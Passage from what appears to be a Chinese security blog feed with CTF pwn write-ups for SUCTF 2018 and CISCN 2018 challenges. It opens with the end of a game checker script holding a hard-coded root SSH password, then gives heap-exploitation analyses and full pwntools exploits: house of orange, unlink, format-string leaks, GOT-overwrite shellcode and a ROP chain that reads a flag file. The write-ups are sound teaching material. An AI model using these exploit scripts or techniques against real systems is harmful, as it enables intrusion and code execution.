f_standard.read(0x28f0-0x1273) md5obj = hashlib.md5() tmp = f.read(0x28f0-0x1273) md5obj.update(tmp) hash_tmp = md5obj.hexdigest() md5obj = hashlib.md5() #tmp = f.read(0x28f0-0x1273) md5obj.update(standard_tmp) hash_standard = md5obj.hexdigest() if (hash_tmp!=hash_standard): f.close() print_log(colored('[Error] in game-&gt;patch game code : ' + oip + '\n', 'red'),ip=oip) return 0 f.close() return 1def check_thread(round): """ function: cheinvalid literal for int() with base 10:ck every targeted ip """ port = 40111#1022 ipbase = '172.16.20.' team_num = 17 check_result = [] # if not debug: # time.sleep(random.randint(10, 20)) print_log( colored('================= Round %d ==================' % round, "green")) for i in range(1, team_num+1): ip = ipbase + str(i) print_log('check ip: ' + ip) check_count = 0 file_check = 1 for i in range(5): """ check 5 times for every ip, if check fail more than three times, then check result is down """ #ip = "127.0.0.1" #port = 2111 single_check = check(ip, port) if single_check == 0: print_log("[check %d] address: %s result: successful" % (i + 1, ip)) elif single_check == 1: check_count += 1 print_log("[check %d] address: %s result: failed" % (i + 1, ip)) # check shell # to determine whether a team uses common guard try: ssh_shell = ssh(host=ip, port = 1022,user='root', password='GA7E12EH2C3CFEBBD1G4',cache=False) ssh_shell.download(file_path,'./file/'+ip+'.bin') ssh_shell.close() #print os.path.getsize('pwn1') #print CalcMD5("DNS_Server_standard") #print CalcMD5('./file/'+ip+'.bin') if (CalcMD5("DNS_Server_standard")!= CalcMD5('./file/'+ip+'.bin')): if abs(os.path.getsize('DNS_Server_standard') - os.path.getsize('./file/'+ip+'.bin')) &gt; 128: print_log(colored('[Warning] find doubtful patch : ' + ip + '\n', 'red'),ip=ip) if(coding_check_level): file_check = patch_check('./file/'+ip+'.bin',"DNS_Server_standard",ip) else: print_log( colored('[info] file size check ok: ' + ip + '\n', 'green')) except Exception as e: print_log(str(e)) print_log( colored('[Error] cannnot connect %s by ssh' % ip, "yellow")) # upload check result into server if(file_check==1): print_log("[patch_check] address: %s result: successful" %(ip)) else: print_log("[patch_check] address: %s result: failed" %(ip)) print_log("") print check_count,file_check if ((check_count &gt;= 2) | (file_check == 0)): check_result.append(&#123;'tid':ip.split('.')[-1],'qid': '3', 'state': 2&#125;) else: check_result.append(&#123;'tid':ip.split('.')[-1],'qid': '3', 'state': 0&#125;) #print check_result try: #print json.dumps(check_result) upload("http://172.16.123.123/commapi/script/setServiceState", &#123;'result': json.dumps(check_result)&#125;) #print json.dumps(check_result) pass except Exception as e: print_log('[HttpError] cannot connect to http server') print_log(str(check_result)) print_log("")def check_test(): port = 2111 ipbase = '172.16.10.' #ip = '10.210.103.168' check_result = [] check_count = 0 for i in range(5): single_check = check(ip, port) if single_check == 0: print_log("[check %d] address: %s result: successful" % (i + 1, ip)) elif single_check == 1: check_count += 1 print_log("[check %d] address: %s result: failed" % (i + 1, ip)) print_log("") if check_count &gt;= 3: check_result.append(&#123;'ip': '172.16.20.3', 'state': 1&#125;) else: check_result.append(&#123;'ip': '172.16.20.3', 'state': 0&#125;) # check shell # to determine whether a team uses common guard # upload check result into server try: upload("http://172.16.123.123/check_the_player.php", &#123;'result': json.dumps(check_result)&#125;) print json.dumps(check_result) pass except Exception as e: print_log('[HttpError] cannot connect to http server') print_log(str(check_result)) print_log("")if __name__ == '__main__': round = 1 if not os.path.exists('./checkresult/'): os.makedirs('./checkresult/') if not os.path.exists('./file/'): os.makedirs('./file/') while True: thread.start_new_thread(check_thread, (round, )) time.sleep(round_time) # five minutes round += 1'''1. patch heap2. login? 1.2.3. serach4. delete single5. ''' Other线下赛的时候在Checker机制中也发现了许多问题，对于通防的思路还是太窄，好在刚开始比赛的时候用size大小的方法+手工的方法查到了NeSE战队的通防，威逼利诱的情况下后来比赛中没有出现其他通防。 偷偷立个flag：想在这个假期写一套自己的通防框架。]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SUCTF 2018部分PWN题复现]]></title>
    <url>%2F2018%2F05%2F29%2Fsuctf2018%2F</url>
    <content type="text"><![CDATA[写论文已经两周了orz，今天终于写完了… SUCTF完全靠大佬们带飞，躺进XCTF联赛决赛圈了.. notenote这题也是被大佬们秒的比较多的题目了，我个人觉得这次PWN出的还是挺好的。 题目分析题目有添加、显示、潘多拉魔盒（？）函数： add： show: pandora box: 可以看出add函数最多可以申请10次（用处不大？），起初初始化程序时申请了两个连续的0x88的块，在pandora box函数中释放，程序不存在修改操作。 漏洞利用漏洞十分明显，在add函数中，对申请堆块的输入使用scanf(“%s”,(&amp;ptr)[i]，显然存在一个堆溢出漏洞，并且对堆块也没有释放操作。看上去让人容易联想起House of orange，其实也是（…） 题目给的库是libc 2.24的，也就是说必须使用_IO_str_jump的方法利用了。 简单的House of orange我曾经发过一篇原理在看雪论坛上，一起食用风味更佳：从BookWriter看house_of_orange原理【新手向】 具体house of orange的手法是用unsorted bin attack将_IO_list_all覆写成unsorted bin 头节点（libc bss段上的main_arena + 88），此时在出错时最终会调用_IO_flush_all函数，具体是程序会从_IO_list_all中取出保存的_IO_FILE_plus指针以虚表的形式调用_IO_flush_all函数。可攻击的点在于_IO_list_all是一个文件指针单链表，当一个指针不满足时会继续执行下一个指针，可以将指针控制到我们可以控制的堆块中（通过修改size），最终伪造_IO_FILE_plus指针内容，劫持控制流。 在libc 2.24中，增加的对_IO_FILE_plus中的虚表进行检查，不允许将虚表指向意外的地方： 1234567891011121314static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123; /* Fast path: The vtable pointer is within the __libc_IO_vtables section. */ uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables; const char *ptr = (const char *) vtable; uintptr_t offset = ptr - __start___libc_IO_vtables; if (__glibc_unlikely (offset &gt;= section_length)) /* The vtable pointer is not in the expected section. Use the slow path, which will terminate the process if necessary. */ _IO_vtable_check (); return vtable;&#125; 这时，大佬们考虑将虚表指向一个libc已存在的虚表，这样可以绕过检查了，由于虚表里指针调用的函数偏移不同，将虚表劫持后，会执行另一个虚表的其他函数，这个虚表被劫持为_IO_str_jumps，当执行想_IO_flush_all，实际上执行了_IO_str_overflow函数，在这个函数中当可以绕过一些判断时，可以执行一个新的函数， new_buf = (char ) (((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); 这个函数同样是相对调用调用，fp时我们可以控制的内存，其内存参数可以通过size计算得到。 可以看到需要满足的条件时： pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only) new_size &lt; old_blen 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061int_IO_str_overflow (_IO_FILE *fp, int c)&#123; int flush_only = c == EOF; _IO_size_t pos; if (fp-&gt;_flags &amp; _IO_NO_WRITES) return flush_only ? 0 : EOF; if ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING)) &#123; fp-&gt;_flags |= _IO_CURRENTLY_PUTTING; fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr; fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end; &#125; pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base; if (pos &gt;= (_IO_size_t) (_IO_blen (fp) + flush_only)) &#123; if (fp-&gt;_flags &amp; _IO_USER_BUF) /* not allowed to enlarge */ return EOF; else &#123; char *new_buf; char *old_buf = fp-&gt;_IO_buf_base; size_t old_blen = _IO_blen (fp); _IO_size_t new_size = 2 * old_blen + 100; if (new_size &lt; old_blen) return EOF; new_buf = (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size); if (new_buf == NULL) &#123; /* __ferror(fp) = 1; */ return EOF; &#125; if (old_buf) &#123; memcpy (new_buf, old_buf, old_blen); (*((_IO_strfile *) fp)-&gt;_s._free_buffer) (old_buf); /* Make sure _IO_setb won't try to delete _IO_buf_base. */ fp-&gt;_IO_buf_base = NULL; &#125; memset (new_buf + old_blen, '\0', new_size - old_blen); _IO_setb (fp, new_buf, new_buf + new_size, 1); fp-&gt;_IO_read_base = new_buf + (fp-&gt;_IO_read_base - old_buf); fp-&gt;_IO_read_ptr = new_buf + (fp-&gt;_IO_read_ptr - old_buf); fp-&gt;_IO_read_end = new_buf + (fp-&gt;_IO_read_end - old_buf); fp-&gt;_IO_write_ptr = new_buf + (fp-&gt;_IO_write_ptr - old_buf); fp-&gt;_IO_write_base = new_buf; fp-&gt;_IO_write_end = fp-&gt;_IO_buf_end; &#125; &#125; if (!flush_only) *fp-&gt;_IO_write_ptr++ = (unsigned char) c; if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_read_end) fp-&gt;_IO_read_end = fp-&gt;_IO_write_ptr; return c;&#125;libc_hidden_def (_IO_str_overflow)#define _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base) 参考simp1e师傅之前关于Hctf-babyprintf题目的利用 ， 可以对参数进行构造： 2 * old_blen + 100 = addr of “/bin/sh” old_blen = (fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base 构造 (fp)-&gt;_IO_buf_end =（ addr of “/bin/sh” - 100） /2 (fp)-&gt;_IO_buf_base = 0 即可 至于如何构造unsorted bin attack可以通过申请堆块，释放原有的堆块，申请小堆块，溢出写来得到，具体exp如下： EXP1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from pwn import *#SUCTF&#123;Me1z1jiu_say_s0rry_LOL&#125;context.log_level='debug'debug=0if debug: p = process('./note') libc=ELF('./libc.so')else : libc = ELF('./libc6_2.24-12ubuntu1_amd64.so')p = remote('pwn.suctf.asuri.org',20003)p.recvuntil('Welcome Homura Note Book! ')def add(size,content): p.recvuntil('Choice&gt;&gt;') p.sendline('1') p.recvuntil('Size:') p.sendline(str(size)) p.recvuntil('Content:') p.sendline(content)def show(index): p.recvuntil('Choice&gt;&gt;') p.sendline('2') p.recvuntil('Index:') p.sendline(str(index))def dele(): p.recvuntil('Choice&gt;&gt;') p.sendline('3') p.recvuntil('(yes:1)') p.sendline('1')add(16,'1'*16)#2#leak system addressdele()show(0)p.recvuntil('Content:')libc_addr = u64(p.recv(6)+'\x00\x00')offset = 0x7f1b15e2ab78-0x7f1b15a66000libc_base = libc_addr - 88 - 0x10 - libc.symbols['__malloc_hook']sys_addr = libc_base+libc.symbols['system']malloc_hook = libc_base+libc.symbols['__malloc_hook']io_list_all = libc_base+libc.symbols['_IO_list_all']binsh_addr = libc_base+next(libc.search('/bin/sh'))log.info('sys_addr:%#x' %sys_addr)#fake chunkfake_chunk = p64(0x8002)+p64(0x61) #headerfake_chunk += p64(0xddaa)+p64(io_list_all-0x10)fake_chunk += p64(0x2)+p64(0xffffffffffffff) + p64(0)*2 +p64((binsh_addr-0x64)/2)fake_chunk = fake_chunk.ljust(0xa0,'\x00')fake_chunk += p64(sys_addr+0x420)fake_chunk = fake_chunk.ljust(0xc0,'\x00')fake_chunk += p64(0)vtable_addr = malloc_hook-13872#+libc.symbols['_IO_str_jumps']payload = 'a'*16 +fake_chunkpayload += p64(0)payload += p64(0)payload += p64(vtable_addr)payload += p64(sys_addr)payload += p64(2)payload += p64(3) payload += p64(0)*3 # vtablepayload += p64(sys_addr)add(16,payload)#3#gdb.attach(p)p.recvuntil('Choice&gt;&gt;')p.sendline('1')p.recvuntil('Size:')p.sendline(str(0x200))p.interactive() noend这道题涉及的主要是非主分配区的分配方式，相关知识、代码分析和调试方法在之前的N1CTF PWN题记录 中提到过。 漏洞分析漏洞存在于main函数中，对于malloc得到的指针，没有检验是否为0，就对size-1的位置写一个0，可以造成一字节的内存任意写 123buf = malloc(size);read(0, buf, size);*((_BYTE *)buf + size - 1) = 0; 但是想要malloc返回为0，需要申请一个巨大的内存块大小，使得正常的main_arena无法处理，在_libc_malloc中有该部分的函数逻辑： 12345678910111213141516171819202122232425262728293031void *__libc_malloc (size_t bytes)&#123; mstate ar_ptr; void *victim; void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); arena_get (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); /* Retry with another arena only if we were able to find a usable arena before. */ if (!victim &amp;&amp; ar_ptr != NULL) &#123; LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); &#125; if (ar_ptr != NULL) (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); return victim;&#125;libc_hidden_def (__libc_malloc) 可以看到，在主分配区返回为空时，会初始化一个非主分配区，即ar_ptr = arena_get_retry (ar_ptr, bytes); ，而在此后，均会使用该非主分配区，而assert断言是在debug模式下起作用的，所以当两个分配区都无法处理时，就会返回一个空指针，造成任意写。 123456789101112131415161718192021arena_get_retry (mstate ar_ptr, size_t bytes)&#123; LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr); if (ar_ptr != &amp;main_arena) &#123; (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); /* Don't touch the main arena if it is corrupt. */ if (arena_is_corrupt (&amp;main_arena)) return NULL; ar_ptr = &amp;main_arena; (void) mutex_lock (&amp;ar_ptr-&gt;mutex); &#125; else &#123; (void) mutex_unlock (&amp;ar_ptr-&gt;mutex); ar_ptr = arena_get2 (bytes, ar_ptr); &#125; return ar_ptr;&#125; 漏洞利用漏洞利用分为地址泄露和地址劫持两部分。 地址泄露在主分配区和非主分配区里，其实质上的内存分配方式是一样的。由于题目限制，申请内存小于等于0x7f时都会释放，而大于时不会释放。 可以首先分配多个不同大小的fastbin大小的块，会释放并挂到fastbin链中去，再申请一个大块（大于0x78，小于等于0x7f），此时，这个块获取的应该为0x90大小，而释放时会与top合并。合并之后，会触发malloc_consolidate，触发后，fastbin中的较小的堆块由于不和top相连，因此会放到unsorted_bin中一次，最后全部合并后与top合并，造成，top中有部分包含main_arena+88或thread_arena+88的地址，可以再次分配回来造成地址泄露。 劫持执行流在非主分配区中，同样利用内存任意写，对threadarena中保存的top末位地址写0，可使top错位，其中size会落到可以控制的堆块地址中，可通过构造size大小使得可以分配到libc的地址中，劫持\_free_hook为system。具体方法是将堆块分配到__free_hook之前，通过top的性质，将被误作为下一块size的__free_hook写为system+1的地址（需要构造提到的top size），虽然是system+1，但对整体没有影响。因为system的前五条指令是： 123456pwndbg&gt; x /5i system 0x7fdf2f15c6a0 &lt;__libc_system&gt;: test rdi,rdi 0x7fdf2f15c6a3 &lt;__libc_system+3&gt;: je 0x7fdf2f15c6b0 &lt;__libc_system+16&gt; 0x7fdf2f15c6a5 &lt;__libc_system+5&gt;: jmp 0x7fdf2f15c130 &lt;do_system&gt; 0x7fdf2f15c6aa &lt;__libc_system+10&gt;: nop WORD PTR [rax+rax*1+0x0] 0x7fdf2f15c6b0 &lt;__libc_system+16&gt;: lea rdi,[rip+0x145591] # 0x7fdf2f2a1c48 system+1的前五条指令是： 123456pwndbg&gt; x /5i system+1 0x7fdf2f15c6a1 &lt;__libc_system+1&gt;: test edi,edi 0x7fdf2f15c6a3 &lt;__libc_system+3&gt;: je 0x7fdf2f15c6b0 &lt;__libc_system+16&gt; 0x7fdf2f15c6a5 &lt;__libc_system+5&gt;: jmp 0x7fdf2f15c130 &lt;do_system&gt; 0x7fdf2f15c6aa &lt;__libc_system+10&gt;: nop WORD PTR [rax+rax*1+0x0] 0x7fdf2f15c6b0 &lt;__libc_system+16&gt;: lea rdi,[rip+0x145591] # 0x7fdf2f2a1c48 可以发现并没有执行上的影响，再次申请一个小堆块（小于0x50），并在其中写上’/bin/sh\0’就可以拿到shell。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#coding:utf-8from ctypes import *from pwn import *import timedebug=1elf = ELF('./noend')if debug: p= process('./noend') context.log_level = 'debug' libc=ELF('/lib/x86_64-linux-gnu/libc.so.6') gdb.attach(p,'c') else: exit(0)def build(size,content): p.sendline(str(size)) time.sleep(0.2) p.send(content) k = p.recvline() return kbuild(0x28,'1'*8)build(0x38,'2'*8)build(0x7f,'a'*8)k = build(0x38,'d'*8) #泄露地址libc.address = u64(k[8:8+8]) - 0x10 - 88 -libc.symbols['__malloc_hook']print '[+] system : ',hex(libc.symbols['system'])p.sendline((str( 0x10 + 87 + libc.symbols['__malloc_hook']))) # 切换到非主分配区time.sleep(0.3)build(0x38,'A'*8)p.clean()build(0x28,'1'*8)build(0x48,'2'*8)build(0x7f,'a'*8)k = build(0x38,'d'*8)thread_arena_addr_top = u64(k[8:8+8])#泄露非主分配区地址print '[+] thread_arena_addr : ',hex(thread_arena_addr_top)target = libc.symbols['system']build(0xf0,p64(target + (libc.symbols['__free_hook'] - thread_arena_addr_top +0x70-0x900 ) )*(0xf0/8))#布置fake top sizep.sendline(str(thread_arena_addr_top+1))#对thread_arena中的top值写末尾一字节time.sleep(0.3)p.sendline()p.recvline()p.clean()time.sleep(1)build(libc.symbols['__free_hook']-(thread_arena_addr_top-0x78+0x900)-0x18,p64(libc.symbols['system']))#将__free_hook劫持为system+1build(0x10,'/bin/sh\0')#free后拿到shell p.interactive() tip对于非主分配区程序的调试，我找到一种相对于简单的方法。 首先利用vmmap指令，找到非主分配区的mmap块位置： 红框中标记的是堆和非主分配区的地址，二者应该是一样大的。 当找到非主分配区地址后，根据libc源码，其中第一块申请的应该是_heap_info结构体，因此，可以看到该结构体内容： 而在该结构体内，其中第一个成员ar_ptr指向的就是非主分配区的arena结构体，与main_arena的结构体是一致的。 注意，在一个thread_arena中仅有一个malloc_state结构体，位于第一个申请的内存块中。 lock2EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148#!/usr/bin/env python# coding=utf-8from pwn import *import itertoolsimport stringimport osdef pwn(offset): # context.log_level = 'DEBUG' p = remote('pwn.suctf.asuri.org', 20001) p.recvuntil('password') p.sendline('123456') def leak_format(start, length): out = '' for i in range(start, start + length): out += '-%%%d$p' % i return out # for i in range(20): # p.recvuntil('cmd:') # format_string = leak_format(2 + 4*i, 4) # p.sendline(format_string) # print p.recvline() def run_cmd(p, cmd): p.recvuntil('cmd:') p.sendline(cmd) def leak_stack(p, index): p.recvuntil('cmd:') p.sendline("%%%d$pAAA" % index) p.recvuntil('cmd:') return int(p.recvuntil('AAA', drop=True), 16) def leak_mem(p, addr): buf = '%7$s' + '=--=' + p64(addr) + 'bb' run_cmd(p, buf) p.recvuntil('cmd:') return p.recvuntil('=--=', drop=True) def write_mem(p, addr, value): if value != 0: buf = ('%%%dc%%7$hn' % value).ljust(8, '=') + p64(addr) + 'bb' else: buf = '%%7$hn'.ljust(8, '=') + p64(addr) + 'bb' run_cmd(p, buf) p.recvuntil('cmd:') def get_codebase(p): code_base = leak_stack(p, 16) &amp; (~0xfff) while True: print hex(code_base) data = leak_mem(p, code_base) if 'ELF' in data: print data break else: code_base -= 0x1000 print 'code_base is ' + hex(code_base) return code_base def dumpmem(offset, length): p = remote('pwn.suctf.asuri.org', 20001) p.recvuntil('password') p.sendline('123456') code_base = get_codebase(p) dump = '' addr = code_base + offset count = 0 while len(dump) &lt; length: count += 1 if '\x0a' in p64(addr): print 'bad addr', hex(addr) addr += 1 dump += '\x00' data = leak_mem(p, addr) data += '\x00' dump += data addr += len(data) print hex(addr) if count % 200 == 0: print dump.encode('hex') p.close() return dump def dumpelf(): for i in range(12): dumpfile = 'dump%02d' % i if os.path.exists(dumpfile): print 'dumpfile %s exists' % dumpfile continue size = 0x400 dump = dumpmem(i*size, size)[:size] print 'dump length is ', len(dump) open(dumpfile, 'wb').write(dump) # dumpelf() # for i in range(2, 20): # try: # print i, hex(leak_stack(i)) # except Exception as e: # print e canary = leak_stack(p, 15) print 'canary is ', hex(canary) p.recvuntil('K ') addr = int(p.recvuntil('--', drop=True), 16) def write_byte(byte): for i in range(8): if byte &gt;&gt; i == 0: break bit = (byte &gt;&gt; i) &amp; 1 write_mem(p, addr + i*4, bit) # for i in range(34, 256): # print i # write_byte(i) # print p.recvline_contains('lock') write_byte(35) p.recvuntil('Box:') func_flag = int(p.recvline().strip('\n'), 16) print 'func_addr is ', hex(func_flag) p.recvuntil('name:') p.sendline('aaaaaaaaaa') # p.sendline('a'*offset + p64(canary) + p64(func_addr)) p.recvuntil('want?') p.sendline('b'*0x1A + p64(canary)*2 + p64(func_flag)*10) p.interactive()for i in range(1): pwn(i) heapEXP12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970from pwn import *context.log_level='debug'debug = 0free_got=0x602018ptr=0x6020c0if debug: p = process('./offbyone') libc = ELF('./libc.so')else: p= remote('pwn.suctf.asuri.org',20004) libc = ELF('./libc-2.23.so')def add(size,data): p.recvuntil('4:edit\n') p.sendline('1') p.recvuntil('input len\n') p.sendline(str(size)) p.recvuntil('input your data\n') p.send(data)def dele(index): p.recvuntil('4:edit\n') p.sendline('2') p.recvuntil('input id\n') p.send(str(index))def show(index): p.recvuntil('4:edit\n') p.sendline('3') p.recvuntil('input id\n') p.send(str(index))def edit(index,data): p.recvuntil('4:edit\n') p.sendline('4') p.recvuntil('input id\n') p.sendline(str(index)) p.recvuntil('input your data\n') p.send(data) add(136,'hack by 0gur1'.ljust(136,'a'))#0add(128,'hack by 0gur2'.ljust(128,'b'))#1add(128,'/bin/sh')#2add(128,'/bin/sh')#3add(128,'hack by 0gur1'.ljust(128,'d'))#4add(136,'hack by 0gur1'.ljust(136,'e'))#5add(128,'hack by 0gur1'.ljust(128,'f'))#6add(128,'hack by 0gur1'.ljust(128,'g'))#7fake_chunk = 'a'*8+p64(0x81) +p64(ptr+40-24)+p64(ptr+40-16)payload= fake_chunkpayload= payload.ljust(0x80,'a')payload+=p64(0x80)payload+='\x90'edit(5,payload)dele(6)edit(5,'\x18\x20\x60')#gdb.attach(p)show(2)free_addr = u64(p.recv(6)+'\x00\x00')sys_addr = free_addr-(libc.symbols['free']-libc.symbols['system'])log.info('sys_addr:%#x' %sys_addr)#gdb.attach(p)edit(2,p64(sys_addr))dele(3)p.interactive()]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解]]></title>
    <url>%2F2018%2F05%2F13%2Fciscn-ctf-2018%2F</url>
    <content type="text"><![CDATA[​ 拖了好久才来整理全国大学生信息安全竞赛的题解，最近都在忙着DEF CON CHINA的RHG比赛的开发，虽然最后貌似只混了一件T恤… 这次比赛本来不想打的，三、四月份的比赛略多，最后趁着五一的假期，被Misty大佬召唤过来打了一天，队伍名称是Xopowo（俄语好的意思？хорошо）。 ​ 最后做出来和复现的有三道：note-service2 、 house_of_grey 、 echo_back note-service2这道题给出的hint是 漏洞分析大致分析了一下题目，题目主要提供了add、delete两个函数： 可能很多人发现的是delete函数那里悬垂指针可被double free的漏洞，但是此题这个漏洞貌似并没有太大的用处，此题存在的问题是，在add函数中输入index时当index是负数或者一个大于预留数组的size可以越界写的问题。并且，此题对got表没有开启RELRO保护，且也没有开启NX保护，这样可以输入负数，覆写got表函数地址，劫持到我们申请的堆块上去执行。换句话说这题只是一道写shellcode的题目，由于之前刷过pwnable.tw，认出了这题是Alive Note这题，这题在pwnable.tw上是32位的题目，并且限制了仅能输入0~9A~Za~z。貌似CISCN是改成了64位。 漏洞利用具体思路我曾经写过blog： http://www.cnblogs.com/p4nda/p/7992951.html（当我发现这题的原型，在国赛期间我心机的隐藏这篇博客，然而可能并没人看...） 思路是利用malloc申请堆块的规律，虽然只能写很少的shellcode，但是可以利用jmp等跳转语句直接跳转到下一块堆块去执行，最终利用系统调用syscall拿到shell，此题我预先在第一块堆块上部署好了”/bin/sh”，劫持了free@got，此时rdi指向这个/bin/sh节省了不少步骤。 EXP123456789101112131415161718192021222324252627282930313233343536from pwn import *from ctypes import *debug = 0elf = ELF('./task_note_service2_OG37AWm')context.update(arch = 'amd64')#ciscn&#123;93707fa0f2eca125f3998d0c6fb1a932&#125;if debug: p = process('./task_note_service2_OG37AWm') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' gdb.attach(p)else: p = remote('117.78.43.123', 31128) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def add(index,content): p.recvuntil('your choice&gt;&gt;') p.sendline('1') p.recvuntil('index') p.sendline(str(index)) p.recvuntil('size') p.sendline(str(8)) p.recvuntil('content') p.send(content)add(0,'/bin/sh')add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xe9\x16')add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xe9\x16')add(2,asm('xor rdx,rdx')+'\x90\x90\xe9\x16')add(3,asm('syscall')+'\x90'*5)p.recvuntil('choice')p.sendline('4')p.recvuntil('index')p.sendline('0')p.interactive() house_of_grey漏洞分析此题的逻辑比较复杂，在main函数中首先利用mmap函数分配了一块内存，再利用clone函数，以mmap动态分配的内存作为栈基址，具体启动了fn函数 在fn函数中首先利用系统沙箱禁止了大部分的系统调用，然后主要提供了4个函数。 漏洞存在于case 1中，在设置文件名称是存在溢出漏洞，可以覆盖v8变量，而v8正是case 4中read的第二个参数，因此总体来说存在内存任意写漏洞。 漏洞利用首先，可以通过读/proc/self/maps来获取各程序段的内存地址，起初以为这样就可以知道全部的内存地址，包括新启动的进程栈地址。 但在实际尝试过程中，发现fn函数的栈底并不是mmap得到内存块的结束地址，而是在其内部还有随机化。 另外还在困惑，在任意写时到底应该写在哪里… w1tcher提示我最终利用exit返回，可以劫持这个流程，但是我头铁决定将case 4中的read参数劫持到read函数的返回地址处，也就是是read自身覆写自身的返回地址… 这样在read函数结束时也就返回到了通过写入的rop中。 这种想法遇到的一个问题是如何拿到随机化的栈地址？ 此时想到另外一个文件/proc/self/mem，这个文件相当于程序内存的一个映射。在测试过程中发现，其栈起始地址与mmap内存块的结束地址相差了一个随机值，而这个随机值是有一定范围的：0xf000000~0xfffffff之间，是可以爆破的，而爆破的过程是，首先利用case 2的定位函数，预先设定一个读取内存地址的起始值，然后不断的向下读，由于程序栈中存在一个明显的字符串标识”/proc/self/mem”，当读到的数据中包含这个字符串时就可以判断找到了栈。 可以简单验证一下可行性，爆破的次数最多可以有24次（共可以进行30次操作，其他操作占有次数），24*100000 = 2400000 = 0x249f00 ， 而可能的范围是0x1000000 其概率为0.1430511474609375，是可以接受的。 另外此题的坑点还有系统调用的限制，最终可以通过open(‘/home/ctf/flag’) read(6,buf,0x100) puts(buf)读出。 EXP123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#coding:utf-8from pwn import *from ctypes import *debug = 0elf = ELF('./task_house_P4U73bf')#ciscn&#123;57de0cd00899090b7193b2a99508e6db&#125;if debug: p = process('./task_house_P4U73bf') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug'else: p = remote('117.78.43.123', 32619) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #off = 0x001b0000 context.log_level = 'debug'p.recvuntil('Y/n')p.sendline('y')p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/maps')p.recvuntil('Exit')p.sendline('3')p.recvuntil('get?')p.sendline('10000')p.recvuntil('something:\n')pie = int('0x'+p.recvuntil('-')[:-1],16)print '[+] pie:',hex(pie)while 1: a = p.recvline() if 'heap' in a: a = p.recvline() stack_start = int(a.split('-')[0],16) stack_end = int((a.split('-')[1]).split(' ')[0],16) print '[+] stack_start:',hex(stack_start) print '[+] stack_end:',hex(stack_end) breakwhile 1: a = p.recvline() if 'libc' in a: libc.address = int(a.split('-')[0],16) print '[+] system:',hex(libc.symbols['system']) breakcanary = 0p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/mem')p.recvuntil('Exit')p.sendline('2')p.recvuntil('you?')stack_guess = 0xf800000p.sendline(str(stack_end - stack_guess - 24*100000))print '[+] offset from ',hex( stack_guess + 24*100000),'to',hex(stack_guess)print '[+] from ',hex(stack_end - stack_guess - 24*100000),'to',hex(stack_end - stack_guess)for i in range(0,24): p.recvuntil('Exit') p.sendline('3') p.recvuntil('get?') p.sendline('100000') p.recvuntil('something:\n') tmp = p.recvuntil('1.Find ')[:-7] if '/mem' in tmp: print '[+++] find' print tmp.split('/proc/self/mem')[0] canary = u64(tmp.split('/proc/self/mem')[0][-0x48:-0x40]) breakstack_address = stack_end - stack_guess - 24*100000 + i *100000 + len(tmp.split('/proc/self/mem')[0])if canary==0: print '[-] fail' exit(0)print '[+] canary :',hex(canary)print '[+] stack :',hex(stack_address)p.recvuntil('Exit')p.sendline('1')p.recvuntil('finding?')p.sendline('/proc/self/mem'+'\x00'*(0x18-14)+p64(stack_address-56))p.recvuntil('Exit')p.sendline('4')p.recvuntil('content')rop =p64(pie+0x0000000000001823)+p64(stack_address-56+0x100)+p64(pie+0x0000000000001821)+p64(0)+p64(0)+p64(pie+elf.symbols['open'])+p64(pie+0x0000000000001823)+p64(6)+p64(pie+0x0000000000001821)+p64(stack_address-56+0x100)+p64(stack_address-56+0x100)+p64(pie+elf.symbols['read'])+p64(pie+0x0000000000001823)+p64(stack_address-56+0x100)+p64(pie+elf.symbols['puts'])rop +='a'*(0x100-len(rop))rop += 